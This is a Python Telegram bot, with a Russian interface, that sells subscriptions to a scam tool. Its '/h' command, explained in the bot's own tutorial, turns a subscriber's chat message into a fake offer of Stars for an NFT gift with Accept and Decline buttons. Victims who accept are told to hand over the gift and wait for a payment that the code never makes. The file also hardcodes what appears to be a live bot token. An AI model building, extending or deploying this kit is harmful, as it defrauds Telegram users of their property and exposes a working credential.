import asyncio, re, sqlite3, datetime, os, random, string
from pathlib import Path
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, LinkPreviewOptions, FSInputFile
from aiogram.filters import Command
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

BOT_TOKEN = "9232358495:AAHAAXXqACqM4-RIDuS1Yxkb2PHOmVH9ZN0"
ADMIN_ID = 8808258682
SELLER_TG = "s3rp3ntcoders"
SUPPORT_TG = "iserpentt"

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

class State(StatesGroup):
    days = State(); keygen = State(); gift = State(); bcast = State(); key = State()
    promo = State(); promo_days = State()

data_dir = Path(os.environ.get("DATA_DIR", "."))
try:
    data_dir.mkdir(parents=True, exist_ok=True); db_path = data_dir / "shop.db"
    tf = data_dir / ".t"; tf.touch(); tf.unlink()
except: db_path = Path("shop.db")

conn = sqlite3.connect(db_path, check_same_thread=False); conn.row_factory = sqlite3.Row
cur = conn.cursor()
for q in [
    "CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, full_name TEXT, sub_until TEXT, blocked INTEGER DEFAULT 0)",
    "CREATE TABLE IF NOT EXISTS keys (key_code TEXT PRIMARY KEY, date_until TEXT)",
    "CREATE TABLE IF NOT EXISTS promos (code TEXT PRIMARY KEY, days INTEGER)",
    "CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, action TEXT, date TEXT)",
    "CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)"
]: cur.execute(q)
conn.commit()

def log(uid, act): cur.execute("INSERT INTO logs (user_id, action, date) VALUES (?,?,?)", (uid, act, datetime.datetime.now().strftime("%Y-%m-%d %H:%M"))); conn.commit()
def get_set(k, d=None): cur.execute("SELECT value FROM settings WHERE key=?", (k,)); r=cur.fetchone(); return r[0] if r else d
def set_set(k, v): cur.execute("INSERT OR REPLACE INTO settings (key,value) VALUES (?,?)", (k,str(v))); conn.commit()
def save_user(u): cur.execute("INSERT INTO users (user_id,username,full_name) VALUES (?,?,?) ON CONFLICT(user_id) DO UPDATE SET username=excluded.username, full_name=excluded.full_name", (u.id,u.username,u.full_name)); conn.commit()

def check_sub(uid):
    cur.execute("SELECT sub_until, blocked FROM users WHERE user_id=?", (uid,)); r=cur.fetchone()
    if not r or r['blocked'] == 1: return False
    return bool(r['sub_until'] and datetime.datetime.now().strftime("%Y-%m-%d") <= r['sub_until'])

def main_menu(): return InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🛒 Купить ключ", callback_data="buy")],
    [InlineKeyboardButton(text="💰 Прайсы", callback_data="prices")],
    [InlineKeyboardButton(text="📖 Туториал", callback_data="tutorial")],
    [InlineKeyboardButton(text="👤 Мой профиль", callback_data="profile")],
    [InlineKeyboardButton(text="🆘 Поддержка", url=f"https://t.me/{SUPPORT_TG}")]
])
def buy_menu(): return InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text=f"✉️ Написать @{SELLER_TG}", url=f"https://t.me/{SELLER_TG}")],
    [InlineKeyboardButton(text="🔑 Ввести ключ", callback_data="enter_key")],
    [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
])
def admin_menu(): return InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="👥 Список юзеров", callback_data="admin_users")],
    [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
    [InlineKeyboardButton(text="🛠 Кейген", callback_data="admin_keygen")],
    [InlineKeyboardButton(text="🎁 Выдать по ID", callback_data="admin_gift")],
    [InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_broadcast")],
    [InlineKeyboardButton(text="🔑 Список ключей", callback_data="admin_keys")],
    [InlineKeyboardButton(text="💾 Скачать базу", callback_data="admin_db")],
    [InlineKeyboardButton(text="🎟 Промокоды", callback_data="admin_promo_menu")],
    [InlineKeyboardButton(text="🚫 Блокировка", callback_data="admin_block_menu")],
    [InlineKeyboardButton(text="📝 Логи", callback_data="admin_logs")]
])

async def chg(m, t, k=None, l=None):
    kw = {}
    if k: kw['reply_markup']=k
    if l: kw['link_preview_options']=LinkPreviewOptions(url=l, prefer_large_media=True)
    try: await m.edit_text(text=t, **kw)
    except:
        try: await m.delete()
        except: pass
        await m.answer(text=t, **kw)

# === СТАРТ ===
@dp.message(Command("start"))
async def start(m: types.Message):
    save_user(m.from_user)
    log(m.from_user.id, "start")
    if m.from_user.id != ADMIN_ID and get_set("notify","1")=="1":
        try: await bot.send_message(ADMIN_ID, f"🔔 <b>Новый юзер!</b>\n\n👤 {m.from_user.full_name}\n🔗 @{m.from_user.username}\nID: <code>{m.from_user.id}</code>")
        except: pass
    await m.answer("👋 <b>Добро пожаловать!</b>\n\n🎁 3 дня бесплатно: @s3rp3ntcoders\n\nВыбери:", reply_markup=main_menu())

@dp.message(Command("menu"))
async def menu(m: types.Message):
    if m.from_user.id == ADMIN_ID: await m.answer("👑 Админ-панель:", reply_markup=admin_menu())

@dp.callback_query(F.data == "admin_main")
async def admin_main(c: types.CallbackQuery): await c.answer(); await c.message.edit_text("👑 Админ-панель:", reply_markup=admin_menu())

# === ЮЗЕРЫ ===
@dp.callback_query(F.data == "admin_users")
async def admin_users(c: types.CallbackQuery):
    await c.answer()
    cur.execute("SELECT user_id, username, full_name, sub_until, blocked FROM users ORDER BY sub_until DESC")
    users = cur.fetchall()
    if not users: return await c.message.edit_text("❌ Пусто.", reply_markup=admin_menu())
    txt = "👥 <b>Юзеры:</b>\n"
    kb = []
    today = datetime.datetime.now().strftime("%Y-%m-%d")
    for u in users:
        st = "✅" if u['sub_until'] and u['sub_until'] >= today else "❌"
        if u['blocked']: st = "🚫"
        txt += f"{st} {u['full_name']} (@{u['username']})\n"
        kb.append([InlineKeyboardButton(text=f"{st} {u['full_name']}", callback_data=f"admin_user_{u['user_id']}")])
    kb.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_main")])
    await c.message.edit_text(txt, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))

@dp.callback_query(F.data.startswith("admin_user_"))
async def admin_user(c: types.CallbackQuery):
    await c.answer()
    uid = int(c.data.split("_")[2])
    cur.execute("SELECT * FROM users WHERE user_id=?", (uid,)); u = cur.fetchone()
    if not u: return await c.message.edit_text("❌ Нет.", reply_markup=admin_menu())
    today = datetime.datetime.now().strftime("%Y-%m-%d")
    st = "✅ Активна" if u['sub_until'] and u['sub_until'] >= today else "❌ Истекла"
    if u['blocked']: st = "🚫 Заблокирован"
    txt = f"👤 <b>{u['full_name']}</b>\n🔗 @{u['username']}\n🆔 <code>{u['user_id']}</code>\n📅 {u['sub_until'] or 'Нет'} ({st})"
    kb = [
        [InlineKeyboardButton(text="➕ Продлить", callback_data=f"admin_ext_{uid}")],
        [InlineKeyboardButton(text="❌ Забрать", callback_data=f"admin_rev_{uid}")],
        [InlineKeyboardButton(text="🚫 Блок" if not u['blocked'] else "✅ Разблок", callback_data=f"admin_blk_{uid}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_users")]
    ]
    await c.message.edit_text(txt, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))

@dp.callback_query(F.data.startswith("admin_ext_"))
async def admin_ext(c: types.CallbackQuery, state: FSMContext):
    await c.answer(); await state.update_data(tid=int(c.data.split("_")[2])); await state.set_state(State.days)
    await c.message.edit_text("➕ Введи дни:")

@dp.message(State.days)
async def p_days(m: types.Message, state: FSMContext):
    if m.from_user.id != ADMIN_ID or not m.text.isdigit(): return
    d = int(m.text); data = await state.get_data(); uid = data['tid']; await state.clear()
    cur.execute("SELECT sub_until FROM users WHERE user_id=?", (uid,)); r = cur.fetchone()
    t = datetime.datetime.now()
    base = datetime.datetime.strptime(r['sub_until'], "%Y-%m-%d") if r and r['sub_until'] and r['sub_until'] > t.strftime("%Y-%m-%d") else t
    nd = (base + datetime.timedelta(days=d)).strftime("%Y-%m-%d")
    cur.execute("UPDATE users SET sub_until=? WHERE user_id=?", (nd, uid)); conn.commit()
    try: await bot.send_message(uid, f"👑 Админ продлил подписку до {nd}")
    except: pass
    await m.answer(f"✅ До {nd}", reply_markup=admin_menu())

@dp.callback_query(F.data.startswith("admin_rev_"))
async def admin_rev(c: types.CallbackQuery):
    await c.answer(); uid = int(c.data.split("_")[2])
    cur.execute("UPDATE users SET sub_until=NULL WHERE user_id=?", (uid,)); conn.commit()
    try: await bot.send_message(uid, "❌ Подписка отменена.")
    except: pass
    await c.answer("Забрано", show_alert=True)

@dp.callback_query(F.data.startswith("admin_blk_"))
async def admin_blk(c: types.CallbackQuery):
    uid = int(c.data.split("_")[2])
    cur.execute("SELECT blocked FROM users WHERE user_id=?", (uid,)); r = cur.fetchone()
    new = 0 if r['blocked'] else 1
    cur.execute("UPDATE users SET blocked=? WHERE user_id=?", (new, uid)); conn.commit()
    await c.answer("Заблокирован" if new else "Разблокирован")
    await admin_user(c)

# === СТАТА ===
@dp.callback_query(F.data == "admin_stats")
async def admin_stats(c: types.CallbackQuery):
    await c.answer()
    cur.execute("SELECT COUNT(*) FROM users"); tot = cur.fetchone()[0]
    td = datetime.datetime.now().strftime("%Y-%m-%d"); cur.execute("SELECT COUNT(*) FROM users WHERE sub_until>=?", (td,)); act = cur.fetchone()[0]
    await c.message.edit_text(f"📊 Всего: {tot}\n✅ Активных: {act}\n❌ Без: {tot-act}", reply_markup=admin_menu())

# === КЕЙГЕН ===
@dp.callback_query(F.data == "admin_keygen")
async def admin_keygen(c: types.CallbackQuery, state: FSMContext):
    await c.answer(); await state.set_state(State.keygen); await c.message.edit_text("🛠 Дни для ключа:")

@dp.message(State.keygen)
async def p_keygen(m: types.Message, state: FSMContext):
    if m.from_user.id != ADMIN_ID or not m.text.isdigit(): return
    d = int(m.text); await state.clear()
    k = "key-" + "".join(random.choice(string.ascii_letters + string.digits) for _ in range(12))
    un = (datetime.datetime.now() + datetime.timedelta(days=d)).strftime("%Y-%m-%d")
    cur.execute("INSERT INTO keys VALUES (?,?)", (k, un)); conn.commit()
    await m.answer(f"✅ Ключ: <code>{k}</code>\nДо: {un} ({d} дн)", reply_markup=admin_menu())

# === ВЫДАТЬ ===
@dp.callback_query(F.data == "admin_gift")
async def admin_gift(c: types.CallbackQuery, state: FSMContext):
    await c.answer(); await state.set_state(State.gift); await c.message.edit_text("🎁 ID и дни (123456789 30):")

@dp.message(State.gift)
async def p_gift(m: types.Message, state: FSMContext):
    if m.from_user.id != ADMIN_ID: return
    a = m.text.split()
    if len(a) != 2 or not a[0].isdigit() or not a[1].isdigit(): return await m.answer("Формат: ID дни")
    uid, d = int(a[0]), int(a[1]); await state.clear()
    nd = (datetime.datetime.now() + datetime.timedelta(days=d)).strftime("%Y-%m-%d")
    cur.execute("UPDATE users SET sub_until=? WHERE user_id=?", (nd, uid)); conn.commit()
    try: await bot.send_message(uid, f"👑 Выдана подписка до {nd}")
    except: pass
    await m.answer(f"✅ До {nd}", reply_markup=admin_menu())

# === РАССЫЛКА ===
@dp.callback_query(F.data == "admin_broadcast")
async def admin_broadcast(c: types.CallbackQuery, state: FSMContext):
    await c.answer(); await state.set_state(State.bcast); await c.message.edit_text("📢 Текст для всех:")

@dp.message(State.bcast)
async def p_bcast(m: types.Message, state: FSMContext):
    if m.from_user.id != ADMIN_ID: return
    t = m.text; await state.clear()
    cur.execute("SELECT user_id FROM users"); us = cur.fetchall()
    ok = no = 0
    for u in us:
        try: await bot.send_message(u['user_id'], t); ok += 1; await asyncio.sleep(0.05)
        except: no += 1
    await m.answer(f"✅ Доставлено: {ok}\n❌ Ошибок: {no}", reply_markup=admin_menu())

# === КЛЮЧИ ===
@dp.callback_query(F.data == "admin_keys")
async def admin_keys(c: types.CallbackQuery):
    await c.answer(); cur.execute("SELECT * FROM keys"); ks = cur.fetchall()
    txt = "🔑 <b>Ключи:</b>\n" + "\n".join(f"<code>{k['key_code']}</code> — {k['date_until']}" for k in ks[-20:])
    await c.message.edit_text(txt or "❌ Нет ключей", reply_markup=admin_menu())

# === БАЗА ===
@dp.callback_query(F.data == "admin_db")
async def admin_db(c: types.CallbackQuery):
    await c.answer()
    try: await c.message.answer_document(FSInputFile(db_path), caption="💾 База")
    except Exception as e: await c.message.answer(f"❌ {e}")

# === ПРОМО ===
@dp.callback_query(F.data == "admin_promo_menu")
async def admin_promo_menu(c: types.CallbackQuery):
    await c.answer(); cur.execute("SELECT * FROM promos"); ps = cur.fetchall()
    txt = "🎟 <b>Промокоды:</b>\n" + "\n".join(f"<code>{p['code']}</code> — {p['days']} дн" for p in ps) if ps else "❌ Нет промокодов."
    kb = [[InlineKeyboardButton(text="➕ Создать промокод", callback_data="admin_newpromo")],[InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_main")]]
    await c.message.edit_text(txt, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))

@dp.callback_query(F.data == "admin_newpromo")
async def admin_newpromo(c: types.CallbackQuery, state: FSMContext):
    await c.answer(); await state.set_state(State.promo); await c.message.edit_text("🎟 Введи название промокода (например: FREE3):")

@dp.message(State.promo)
async def p_promo(m: types.Message, state: FSMContext):
    if m.from_user.id != ADMIN_ID: return
    await state.update_data(code=m.text.strip()); await state.set_state(State.promo_days); await m.answer("Сколько дней?")

@dp.message(State.promo_days)
async def p_promo_days(m: types.Message, state: FSMContext):
    if m.from_user.id != ADMIN_ID or not m.text.isdigit(): return
    d = int(m.text); data = await state.get_data(); code = data['code']; await state.clear()
    cur.execute("INSERT OR REPLACE INTO promos VALUES (?,?)", (code, d)); conn.commit()
    await m.answer(f"✅ Промокод <code>{code}</code> на {d} дней создан!", reply_markup=admin_menu())

# === БЛОКИРОВКА ===
@dp.callback_query(F.data == "admin_block_menu")
async def admin_block_menu(c: types.CallbackQuery):
    await c.answer(); cur.execute("SELECT user_id, full_name, username FROM users WHERE blocked=1"); bs = cur.fetchall()
    txt = "🚫 <b>Заблокированы:</b>\n" + "\n".join(f"{b['full_name']} (@{b['username']})" for b in bs) if bs else "❌ Никто не заблокирован."
    kb = [[InlineKeyboardButton(text=f"✅ {b['full_name']}", callback_data=f"admin_unblock_{b['user_id']}")] for b in bs]
    kb.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_main")])
    await c.message.edit_text(txt, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))

@dp.callback_query(F.data.startswith("admin_unblock_"))
async def admin_unblock(c: types.CallbackQuery):
    uid = int(c.data.split("_")[2]); cur.execute("UPDATE users SET blocked=0 WHERE user_id=?", (uid,)); conn.commit()
    await c.answer("Разблокирован"); await admin_block_menu(c)

# === ЛОГИ ===
@dp.callback_query(F.data == "admin_logs")
async def admin_logs(c: types.CallbackQuery):
    await c.answer(); cur.execute("SELECT * FROM logs ORDER BY id DESC LIMIT 30"); ls = cur.fetchall()
    txt = "📝 <b>Логи:</b>\n" + "\n".join(f"{l['date']} | {l['user_id']} | {l['action']}" for l in ls)
    await c.message.edit_text(txt or "Пусто", reply_markup=admin_menu())

# === КНОПКИ МАГАЗИНА ===
@dp.callback_query(F.data == "main_menu")
async def to_main(c: types.CallbackQuery): await c.answer(); await c.message.edit_text("👋 Выбери:", reply_markup=main_menu())

@dp.callback_query(F.data == "tutorial")
async def tutorial(c: types.CallbackQuery):
    await c.answer()
    await c.message.edit_text("📖 <b>Как сделать оффер:</b>\n\n1. В личке с челом напиши:\n<code>/h [ссылка] [цена] [stars] [ru]</code>\n\nПример:\n<code>/h https://t.me/nft/CloverPin-193200 1200 stars ru</code>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]]))

@dp.callback_query(F.data == "profile")
async def profile(c: types.CallbackQuery):
    await c.answer(); cur.execute("SELECT sub_until FROM users WHERE user_id=?", (c.from_user.id,)); r = cur.fetchone()
    txt = "❌ Нет подписки" if not r or not r[0] or r[0] < datetime.datetime.now().strftime("%Y-%m-%d") else f"✅ До {r[0]}"
    await c.message.edit_text(f"👤 <b>Профиль</b>\n\n{txt}", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]]))

@dp.callback_query(F.data == "buy")
async def buy(c: types.CallbackQuery): await c.answer(); await c.message.edit_text("💎 Покупка ключа", reply_markup=buy_menu())

@dp.callback_query(F.data == "enter_key")
async def enter_key(c: types.CallbackQuery, state: FSMContext):
    await c.answer(); await state.set_state(State.key); await c.message.edit_text("🔑 Введи ключ:")

@dp.message(State.key)
async def p_key(m: types.Message, state: FSMContext):
    k = m.text.strip(); await state.clear(); save_user(m.from_user)
    log(m.from_user.id, f"key:{k}")
    cur.execute("SELECT date_until FROM keys WHERE key_code=?", (k,)); r = cur.fetchone()
    if r:
        cur.execute("UPDATE users SET sub_until=? WHERE user_id=?", (r[0], m.from_user.id)); conn.commit()
        return await m.answer(f"✅ Ключ активирован! До {r[0]}", reply_markup=main_menu())
    cur.execute("SELECT days FROM promos WHERE code=?", (k,)); p = cur.fetchone()
    if p:
        nd = (datetime.datetime.now() + datetime.timedelta(days=p['days'])).strftime("%Y-%m-%d")
        cur.execute("UPDATE users SET sub_until=? WHERE user_id=?", (nd, m.from_user.id)); conn.commit()
        return await m.answer(f"✅ Промокод активирован! До {nd}", reply_markup=main_menu())
    await m.answer("❌ Неверный ключ!", reply_markup=buy_menu())

@dp.callback_query(F.data == "prices")
async def prices(c: types.CallbackQuery):
    await c.answer(); txt = get_set("prices", "💰 <b>Прайсы:</b>\n\n▫️ 2 недели — 49 руб.\n▫️ 1 месяц — 99 руб.\n▫️ 6 месяцев — 299 руб.\n▫️ 1 год — 499 руб.\n▫️ Навсегда — 699 руб.")
    await c.message.edit_text(txt, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"✉️ @{SELLER_TG}", url=f"https://t.me/{SELLER_TG}")],[InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]]))

# === ОФФЕР ===
@dp.business_message(F.text.startswith("/h"))
async def offer(m: types.Message):
    save_user(m.from_user)
    if not check_sub(m.from_user.id):
        try: await m.delete()
        except: pass
        return await m.answer("⛔ Нет подписки!")
    a = m.text.split()
    if len(a) < 5: return
    link, price, lang = a[1], a[2], a[4].lower()
    match = re.search(r'/nft/([^-]+)-(\d+)', link); g = match.group(1) if match else "NFT"
    sname = m.from_user.first_name; suser = m.from_user.username or str(m.from_user.id)
    txt = f"Пользователь @{suser} ({sname}) предлагает {price} ⭐ за {g}"
    btn = ("Принять", "Отклонить") if lang == "ru" else ("Accept", "Decline")
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"✅ {btn[0]}", callback_data=f"acc_{price}_{g}_{suser}"), InlineKeyboardButton(text=f"❌ {btn[1]}", callback_data="dec")]])
    try: await m.edit_text(txt, reply_markup=kb, link_preview_options=LinkPreviewOptions(url=link, prefer_large_media=True))
    except:
        try: await m.delete()
        except: pass
        await m.answer(txt, reply_markup=kb, link_preview_options=LinkPreviewOptions(url=link, prefer_large_media=True))

@dp.callback_query(F.data.startswith("acc_"))
async def acc(c: types.CallbackQuery):
    await c.answer(); parts = c.data.split("_", 3); price, g, suser = parts[1], parts[2], parts[3]
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="📤 Отправить", url=f"https://t.me/{suser}")], [InlineKeyboardButton(text="✅ Я отправил", callback_data=f"snt_{price}_{g}_{suser}")]])
    await chg(c.message, f"✅ Принято!\nОтправь {g} @{suser}\n\nОжидай {price} ⭐", kb)

@dp.callback_query(F.data.startswith("snt_"))
async def snt(c: types.CallbackQuery):
    await c.answer(); parts = c.data.split("_", 3); price, g, suser = parts[1], parts[2], parts[3]
    await chg(c.message, f"✅ Оффер завершен!\n{g} передан @{suser}\nОжидай {price} ⭐")
    try:
        cur.execute("SELECT user_id FROM users WHERE username=?", (suser,)); r = cur.fetchone()
        if r: await bot.send_message(r['user_id'], f"🎉 Оффер выкуплен!\nПокупатель отправил {g}\nСумма: {price} ⭐")
    except: pass

@dp.callback_query(F.data == "dec")
async def dec(c: types.CallbackQuery): await c.answer(); await chg(c.message, "❌ Оффер отклонен")

async def main():
    print("Бот запущен.")
    await dp.start_polling(bot, allowed_updates=["message", "callback_query", "business_message"])

if __name__ == "__main__":
    asyncio.run(main())
